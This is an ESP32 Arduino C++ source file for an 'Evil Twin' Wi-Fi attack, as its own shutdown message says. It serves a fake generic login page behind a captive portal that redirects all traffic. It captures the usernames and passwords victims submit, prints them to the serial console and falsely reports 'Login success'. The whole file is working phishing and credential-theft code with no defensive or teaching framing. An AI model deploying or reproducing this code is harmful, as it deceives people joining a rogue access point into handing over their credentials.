#include "web_handler.h"

#include <WiFi.h>
#include <WebServer.h>

// html code of the login page showed to user. //
const char *login_page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: #ffffff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      width: 280px;
    }
    h2 {
      margin-bottom: 16px;
      font-size: 20px;
      color: #333;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #bbb;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 14px;
    }
    input[type="submit"] {
      background-color: #388e3c; /* Verde più caldo */
      color: white;
      padding: 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      font-size: 15px;
      margin-top: 10px;
    }
    input[type="submit"]:hover {
      background-color: #2e7d32;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form action="/submit" method="POST">
      <input type="text" id="username" name="username" placeholder="Username" required>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
    )rawliteral";

void setup_web_handler() {
    http_server.on("/", main_handler);
    http_server.on("/submit", submit_handler);
    http_server.on("/shutdown", shutdown_handler);
    http_server.onNotFound(captive_portal);
}

void captive_portal() {   
    http_server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    http_server.send(302, "text/plain", ""); 
}

void main_handler() {
    http_server.send(200, "text/html", login_page);
}

void submit_handler() {
    if (http_server.method() == HTTP_POST) {
        String username = http_server.arg("username");
        String password = http_server.arg("password");
    
        Serial.print("Username: ");
        Serial.println(username);
        Serial.print("Password: ");
        Serial.println(password);

        http_server.send(200, "text/plain", "Login success");
    } else {
        http_server.send(405, "text/plain", "Method Not Allowed");
    }
}

void shutdown_handler() {
    http_server.send(200, "text/plain", "Shutting down the Evil Twin...");
    delay(1000); 
    ESP.deepSleep(0); 
}